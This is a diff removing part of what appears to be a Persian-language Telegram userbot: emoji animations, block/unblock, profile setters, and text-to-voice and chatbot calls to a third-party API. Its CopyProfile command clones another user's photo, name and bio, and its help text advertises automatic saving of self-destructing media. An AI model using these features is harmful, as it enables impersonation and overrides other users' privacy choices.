-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-                                """ , message_id=message.id)
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-                                """ , message_id=message.id)
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-                                """ , message_id=message.id)
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◼️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-                                """ , message_id=message.id)
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◼️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-                                """ , message_id=message.id)
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◼️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-                                """ , message_id=message.id)
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◼️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-                                """ , message_id=message.id)
-        
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◼️◼️◼️◼️
-◼️◼️◼️◼️◼️
-                                """ , message_id=message.id)
-        
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◼️◼️◼️
-◼️◼️◼️◼️◼️
-                                """ , message_id=message.id)
-        
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◼️◼️
-◼️◼️◼️◼️◼️
-                                """ , message_id=message.id)
-        
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◼️
-◼️◼️◼️◼️◼️
-                                """ , message_id=message.id)
-        
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◼️◼️◼️◼️◼️
-                                """ , message_id=message.id)
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◼️◼️◼️◼️
-                                """ , message_id=message.id)
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◼️◼️◼️
-                                """ , message_id=message.id)
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◼️◼️
-                                """ , message_id=message.id)
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◼️
-                                """ , message_id=message.id)
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️
-                                """ , message_id=message.id)
-        
-        time.sleep(0.5)
-
-        await bot.edit_message_text(chat_id=message.chat.id , text="تمام" , message_id=message.id)
-
-    if message.text == "قلب":
-        await bot.edit_message_text(chat_id=message.chat.id , text="❤️" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="🧡" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="💛" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="💚" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="💙" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="💜" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="🖤" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="🤎" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="❤️‍🔥" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="❤️‍🩹" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="❣️" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="💓" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="💗" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="❤️" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="🧡" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="💛" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="💚" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="💙" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="💜" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="🖤" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="🤎" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="❤️‍🔥" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="❤️‍🩹" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="❣️" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="💓" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text="💗" , message_id=message.id)
-
-
-    if message.text == "bot" or message.text == "ربات":
-        await bot.send_message(chat_id=message.chat.id , text= "Self is on" , reply_to_message_id=message.id)
-
-    if message.text == "Block":
-        await bot.edit_message_text(chat_id=message.chat.id , text="User Blocked" , message_id=message.id)
-        await bot.block_user(user_id=message.chat.id)
-        await bot.block_user(user_id=message.reply_to_message.from_user.id)
-
-    if message.text == "UnBlock":
-        # await bot.unblock_user(user_id=)
-        await bot.edit_message_text(chat_id=message.chat.id , text="User UnBlocked" , message_id=message.id)
-        await bot.unblock_user(user_id=message.reply_to_message.from_user.id)
-        await bot.unblock_user(user_id=message.chat.id)
-
-    if "ویس " in str(message.text) :
-        result = message.text.split("ویس ")
-        text = result[1]
-
-        url = f"https://haji-api.ir/text-to-voice/?text={text}&Character=DilaraNeural"
-        response = requests.get(url)  
-
-        if response.status_code == 200:  
-            content = response.content  
-
-            try:
-                data = json.loads(content) 
-                url_from_json = data['results']['url']  
-                await bot.send_voice(chat_id=message.chat.id ,voice=url_from_json , reply_to_message_id=message.id )
-            except json.JSONDecodeError:
-                await bot.send_message(chat_id=message.chat.id , text="خطا در دیکد وب سرویس" , reply_to_message_id=message.id)
-        else:
-            await bot.send_message(chat_id=message.chat.id ,text="خطا در اتصال به وب سرویس" , reply_to_message_id=message.id)
-
-    if message.text == "SetName":
-        names = message.reply_to_message.text
-        await bot.update_profile(first_name=names)
-        await bot.edit_message_text(chat_id=message.chat.id , text=f"The Name : [ {names} ] is Seted" , message_id=message.id)
-    
-    if message.text == "SetBio":
-        Bios = message.reply_to_message.text
-        await bot.update_profile(bio=Bios)
-        await bot.edit_message_text(chat_id=message.chat.id , text=f"The Bio : [ {Bios} ] is Seted" , message_id=message.id)
-
-
-    if message.text == "SetProfile":
-        pm = message.reply_to_message
-        if pm.photo:
-            await bot.edit_message_text(chat_id=message.chat.id , text=f"Whate . . ." , message_id=message.id)
-            try:
-                rand = random.randint(1000, 9999999)
-                local = f"downloads/photo-{rand}.jpg"
-                await bot.download_media(message=pm.photo.file_id, file_name=f"photo-{rand}.jpg")
-                await bot.set_profile_photo(photo=f"downloads/photo-{rand}.jpg")
-                await bot.edit_message_text(chat_id=message.chat.id , text=f"Photo Is Seted" , message_id=message.id)
-                os.remove(local)
-            except PhotoCropSizeSmall:
-                await bot.edit_message_text(chat_id=message.chat.id , text=f"Photo Is Small" , message_id=message.id)
-                os.remove(local)
-
-
-        elif pm.video:
-            await bot.edit_message_text(chat_id=message.chat.id , text=f"Whate . . ." , message_id=message.id)
-            rand = random.randint(1000, 9999999)
-            local = f"downloads/Video-{rand}.mp4"
-            await bot.download_media(message=pm.video.file_id, file_name=f"Video-{rand}.mp4")
-            await bot.set_profile_photo(video=local)
-            await bot.edit_message_text(chat_id=message.chat.id , text=f"Video Is Seted" , message_id=message.id)
-            os.remove(local)
-
-        else:
-            await bot.edit_message_text(chat_id=message.chat.id , text=f"Not Photo or Video" , message_id=message.id)
-
-    if "gpt " in str(message.text) : 
-        result = message.text.split("gpt ")
-        text = result[1]
-
-        url = f"https://haji-api.ir/Free-GPT3/?text={text}"
-        response = requests.get(url)  
-
-        if response.status_code == 200:  
-            content = response.content  
-
-            try:
-                data = json.loads(content) 
-                answer = data['result']['answer']  
-                await bot.send_message(chat_id=message.chat.id , text=answer , reply_to_message_id=message.id)
-            except json.JSONDecodeError:
-                await bot.send_message(chat_id=message.chat.id , text="خطا در دیکد وب سرویس" , reply_to_message_id=message.id)
-        else:
-            await bot.send_message(chat_id=message.chat.id ,text="خطا در اتصال به وب سرویس" , reply_to_message_id=message.id)
-
-    if message.text == "self" or message.text == "سلف" or message.text == "/help":
-        await bot.send_message(chat_id=message.chat.id , text="""
-.
-< راهنمای سلف >
-
-بلاک کردن کاربر ( ریپلای یا در پیوی ) => <pre>Block</pre>
-                               
-آنبلاک کردن کاربر ( ریپلای یا در پیوی ) => <pre>UnBlock</pre>
-
-➖➖➖➖➖➖➖➖➖➖➖
-
-تنظیم اسم => <pre>SetName</pre> (Reply)
-                               
-تنظیم بیو => <pre>SetBio</pre> (Reply)
-                               
-تنظیم پروفایل ( عکس , ویدیو ) ( ریپلای ) => <pre>SetProfile</pre>  
-                               
-➖➖➖➖➖➖➖➖➖➖➖
-
-تایم در اسم => <pre>TimeName on | off</pre> 
-                               
-تایم در بیو => <pre>TimeBio on | off</pre> 
-                               
-فونت‌تایم‌=> <pre> ‌SetFont‌ 1‌ or‌ 2‌ or‌ 3‌ or‌ 4‌ or‌ Random</pre>
-                               
-➖➖➖➖➖➖➖➖➖➖➖
-
-سیو ( عکس , فیلم ) تایم دار => خودکار
-آنتی لاگین => خودکار
-                               
-➖➖➖➖➖➖➖➖➖➖➖
-
-تبدیل متن به ویس => <pre>ویس اینجا متن قرار بدید</pre>
-                               
-هوش مصنوعی ( ChatGPT ) => <pre>gpt TEXT</pre>
-
-➖➖➖➖➖➖➖➖➖➖➖
-
-سرگرمی ها :
-مربع , قلب , مکعب , لودینگ , قلب بزرگ , بکیرم
-
-➖➖➖➖➖➖➖➖➖➖➖
-
-ورژن 2
-صفحه دوم راهنما => <pre>راهنما 2</pre><pre>help2</pre><pre>/help2</pre>
-
-                    """ , reply_to_message_id=message.id , parse_mode=enums.ParseMode.HTML)
-        
-    if message.text == "help2" or message.text == "راهنما 2" or message.text == "/help2":
-        await bot.send_message(chat_id=message.chat.id , text="""
-.
-< راهنمای سلف صفحه 2 >
-
-کپی کردن پروفایل دیگران ( ریپلای یا در پیوی ) => <pre>CopyProfile</pre>
-ریست پروفایل ( ریپلای یا در پیوی ) => <pre>UnCopyProfile</pre>
-
-➖➖➖➖➖➖➖➖➖➖➖
-
-دانلود از یوتیوب ( بجای LINK لینکتون بزارید ) => <pre>!YouTube LINK</pre>
-                               
-➖➖➖➖➖➖➖➖➖➖➖
-
-ست انمی ( ریپلای یا در پیوی )  => SetEnemy
-حذف انمی ( ریپلای یا در پیوی )  => DelEnemy
-                               
-سکوت کاربر ( ریپلای یا در پیوی )  => Mute
-حذف سکوت کاربر ( ریپلای یا در پیوی )  => UnMute
-                               
-➖➖➖➖➖➖➖➖➖➖➖
-                               
-بولد متن => <pre>bold on | off</pre> 
-ایتالیک متن => <pre>italic on | off</pre> 
-پارت پارت متن => <pre>part on | off</pre> 
-لینک دار متن => <pre>link on | off</pre> 
-زیرخط متن => <pre>underline on | off</pre> 
-
-➖➖➖➖➖➖➖➖➖➖➖
-
-حالت در حال بازی => <pre>playing on | off</pre> 
-حالت در حال تایپ => <pre>typing on | off</pre> 
-حالت در حال رکورد ویدیو => <pre>RECORD_VIDEO on | off</pre> 
-حالت در حال انتخاب استیکر => <pre>CHOOSE_STICKER on | off</pre> 
-حالت در حال ارسال ویدیو => <pre>UPLOAD_VIDEO on | off</pre> 
-حالت در حال ارسال فایل => <pre>UPLOAD_DOCUMENT on | off</pre> 
-حالت در حال ارسال موزیک => <pre>UPLOAD_AUDIO on | off</pre> 
-حالت در حال ضبط صدا => <pre>SPEAKING on | off</pre> 
-                               
-
-ورژن 2
-
-                    """ , reply_to_message_id=message.id , parse_mode=enums.ParseMode.HTML)
-
-
-    if message.text == "CopyProfile":
-        await bot.edit_message_text(chat_id=message.chat.id , text="Whate . . ." , message_id=message.id)
-        if message.reply_to_message:
-            profileBio = await bot.invoke(pyrogram.raw.functions.users.GetFullUser(id=await bot.resolve_peer(message.reply_to_message.from_user.id)))
-
-            if message.reply_to_message.from_user.photo.big_file_id:
-                ProfilePhoto = message.reply_to_message.from_user.photo.big_file_id
-            
-                rand = random.randint(1000, 9999999)
-                local = f"downloads/photo-{rand}.png"
-                await bot.download_media(message=ProfilePhoto, file_name=local)
-                await bot.set_profile_photo(photo=local)
-                os.remove(local)
-
-            if message.reply_to_message.from_user.first_name :
-                Name = message.reply_to_message.from_user.first_name
-                await bot.update_profile(first_name=Name )
-
-            if profileBio.full_user.about :
-                await bot.update_profile(bio=profileBio.full_user.about )
-            
-            await bot.edit_message_text(chat_id=message.chat.id , text="Profile Copyed" , message_id=message.id)
-        else:
-
-            profileBio = await bot.invoke(pyrogram.raw.functions.users.GetFullUser(id=await bot.resolve_peer(message.chat.id)))
-            
-            if message.chat.photo.big_file_id :
-                ProfilePhoto = message.chat.photo.big_file_id
-                rand = random.randint(1000, 9999999)
-                local = f"downloads/photo-{rand}.png"
-                await bot.download_media(message=ProfilePhoto, file_name=local)
-                await bot.set_profile_photo(photo=local)
-                os.remove(local)
-
-            if message.chat.first_name:
-                Name = message.chat.first_name
-                await bot.update_profile(first_name=Name )
-
-            if profileBio.full_user.about:
-                await bot.update_profile(bio=profileBio.full_user.about )
-                
-            
-            await bot.edit_message_text(chat_id=message.chat.id , text="Profile Copyed" , message_id=message.id)
-
-    if message.text == "UnCopyProfile":
-            
-            with open(f"data/{admin}/name.txt", "r" , encoding="utf-8") as file1:
-                name = file1.read()
-            
-            with open(f"data/{admin}/bio.txt", "r" , encoding="utf-8") as file:
-                bio = file.read()
-
-            await bot.set_profile_photo(photo=f"data/{admin}/profile.png")
-
-            await bot.update_profile(first_name=name , bio=bio)
-            
-            await bot.edit_message_text(chat_id=message.chat.id , text="Profile is Reasted" , message_id=message.id)
-
-    if message.text == "قلب بزرگ":
-        msg = await bot.edit_message_text(chat_id=message.chat.id , text="""
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
-        """ , message_id=message.id)
-
-        msgid = message.id
-
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-                                """ , message_id=msgid)
-        
-        
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-                                """ , message_id=msgid)
-        
-        
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-                                """ , message_id=msgid)
-        
-        
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
-                                """ , message_id=msgid)
-        
-        
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
-🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
-                                """ , message_id=msgid)
-        
-        
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
-🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
-🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
-                                """ , message_id=msgid)
-        
-        
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
-🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
-🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
-🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
-                                """ , message_id=msgid)
-        
-        
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
-🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
-🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
-🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
-🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
-                                """ , message_id=msgid)
-        
-        
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
-🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
-🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
-🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
-🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
-                                """ , message_id=msgid)
-        
-        
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
-🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
-🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
-🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
-🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
-                                """ , message_id=msgid)
-        
-        
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
-🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
-🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
-🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
-🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-                                """ , message_id=msgid)
-        
-        
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
-🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
-🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
-🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
-🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-                                """ , message_id=msgid)
-        
-        
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
-🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
-🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
-🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
-🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-                                """ , message_id=msgid)
-        
-        
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
-🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
-🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
-🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
-🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕
-                                """ , message_id=msgid)
-        
-        
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
-🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
-🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
-🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
-🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕
-🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
-                                """ , message_id=msgid)
-        
-        
-        
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
-🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
-🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
-🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
-🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕
-🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
-🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
-                                """ , message_id=msgid)
-        
-        
-        
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
-🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
-🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
-🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
-🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕
-🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
-🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
-🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
